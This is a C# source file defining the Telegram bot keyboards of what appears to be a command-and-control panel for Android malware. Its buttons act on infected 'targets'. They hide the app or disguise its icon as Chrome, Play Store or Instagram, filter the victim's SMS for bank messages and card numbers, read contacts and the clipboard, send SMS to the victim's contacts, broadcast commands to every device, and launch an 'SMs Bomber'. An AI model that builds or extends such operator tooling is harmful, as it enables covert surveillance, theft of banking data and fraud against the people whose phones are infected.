using Telegram.BotAPI.AvailableTypes;

namespace Presentation.Common.Constant;

public class KeyboardConstant
{
    public static InlineKeyboardMarkup KeyboardMarkupPanelMain()
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "All Targets 📡", callbackData: "TargetList"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "Broadcast options ☎", callbackData: $"PublicOption"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "Download 📥", callbackData: "Download"),
                InlineKeyboardButton.SetCallbackData(text: "Settings ⚙️", callbackData: "Configuration"),
            },

        };
        return new InlineKeyboardMarkup(keyboard);
    }

    public static InlineKeyboardMarkup KeyboardMarkupSendSMS(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "send to contacts 📚", callbackData: $"SendToContact|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: $"MainMenu"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }
    public static InlineKeyboardMarkup KeyboardMarkupChangeIcon(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Chrome", callbackData: $"-IconChrome|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "➖ Default", callbackData: $"-IconDefault|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Google", callbackData: $"-IconGoogle|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "➖ Play Store", callbackData: $"-IconPlayStore|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Instagram", callbackData: $"-IconInstagram|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Telegram", callbackData: $"-IconTelegram|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: $"ControlPanel|{target}"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }


    public static InlineKeyboardMarkup KeyboardMarkupFilterContact(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ WhatsApp", callbackData: $"-FilterContactWhatsApp|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "➖ Contacts", callbackData: $"-FilterContactAll|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: $"ControlPanel|{target}"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }

    public static InlineKeyboardMarkup KeyboardMarkupFilterMessage(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Sim Message", callbackData: $"FilterMessageOperator|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "➖ Bank Message", callbackData: $"FilterMessageBank|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Contact Message", callbackData: $"FilterMessageContact|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Find phone", callbackData: $"FilterMessagePhone|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "➖ Find Card", callbackData: $"FilterMessageCard|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Last Message", callbackData: $"FilterMessageLast|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: $"ControlPanel|{target}"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }
    public static InlineKeyboardMarkup KeyboardMarkupControlPanel(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Control Panel", callbackData: $"ControlPanel|{target}"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }
    public static InlineKeyboardMarkup KeyboardMarkupPublicOption()
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "📻 Ping All", callbackData: $"-PingApplication|BROADCAST"),
                InlineKeyboardButton.SetCallbackData(text: "⌨ Set Clipboard", callbackData: $"ChangeClipboard|BROADCAST"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🖼 Change Template", callbackData: $"ChangeTemplate|BROADCAST"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "👻 Hide All", callbackData: $"-HideApplication|BROADCAST"),
                InlineKeyboardButton.SetCallbackData(text: "📺 Show All", callbackData: $"-ShowApplication|BROADCAST"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "📢 Send Notify", callbackData: $"CreateNotification|BROADCAST"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "💣 SMs Bomber", callbackData: $"SendMessage|BROADCAST"),
                InlineKeyboardButton.SetCallbackData(text: "🎃 Offline Mode", callbackData: $"OfflineMode|BROADCAST"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: "MainMenu"),
            },

        };
        return new InlineKeyboardMarkup(keyboard);

    }
    public static InlineKeyboardMarkup KeyboardMarkupManageTarget(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "👻 Hide App", callbackData: $"-HideApplication|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "📺 Show App", callbackData: $"-ShowApplication|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "📲 Information", callbackData: $"-InfoApplication|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🎚 Silent App", callbackData: $"-SilentApplication|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "📼 Normatl App", callbackData: $"-NormalApplication|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "⏳ Filter Sms", callbackData: $"MessageApplication|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "📪 Contacts", callbackData: $"ContactApplication|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🛎 Send SMS", callbackData: $"SendMessage|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "📢 Send Notify", callbackData: $"CreateNotification|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "⌨ Set Clipboard", callbackData: $"ChangeClipboard|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🔗 Get Clipboard", callbackData: $"-ClipboardApplication|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🖼 Change Template", callbackData: $"ChangeTemplate|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "📱 Application", callbackData: $"-PackageApplication|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "✏ Set Name", callbackData: $"ChangeFullname|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🎭 Change Icon", callbackData: $"ChangeIconApplication|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔊 Play Sound", callbackData: $"-PlaySound|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🔈 Pouse Sound", callbackData: $"-PouseSound|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🎃 Offline Mode", callbackData: $"OfflineMode|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔎 Ping app", callbackData: $"-PingApplication|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData("❌ Delete", callbackData: $"DeleteTarget|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: "MainMenu"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);

    }
    public static InlineKeyboardMarkup KeyboardMarkupOfflineMode(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Enable", callbackData: $"-EnablePhoneOffMode|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "➖ Disable", callbackData: $"-DisablePhoneOffMode|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Set Phone", callbackData: $"ChangePhoneOffMode|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "➖ Status", callbackData: $"-StatusOfflineMode|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: $"MainMenu"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }
    public static InlineKeyboardMarkup KeyboardMarkupConfiguration(ConfigurationDynamic configuration)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "Auto Hide", callbackData: $"None"),
                InlineKeyboardButton.SetCallbackData(text: configuration.AutomaticHide ? "🟢" : "🔴", callbackData: $"ChangeAutomaticHide"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "Public Access", callbackData: $"None"),
                InlineKeyboardButton.SetCallbackData(text: configuration.PublicPermission ? "🟢" : "🔴", callbackData: $"ChangePublicAccess"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: "MainMenu"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }
    public static InlineKeyboardMarkup KeyboardMarkupBack(string CallbackData = "MainMenu")
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: CallbackData),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }
    public static InlineKeyboardMarkup KeyboardMarkupSelectSim(string target)
    {
        var keyboard = new[]
        {
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🫀 Sim One", callbackData: $"WithOne|{target}"),
                InlineKeyboardButton.SetCallbackData(text: "🫀 Sim Two", callbackData: $"WithTwo|{target}"),
            },
            new List<InlineKeyboardButton>()
            {
                InlineKeyboardButton.SetCallbackData(text: "🔙", callbackData: $"MainMenu"),
            },
        };
        return new InlineKeyboardMarkup(keyboard);
    }
    public static InlineKeyboardMarkup KeyboardMarkupEmpty()
    {
        return new InlineKeyboardMarkup();
    }
}
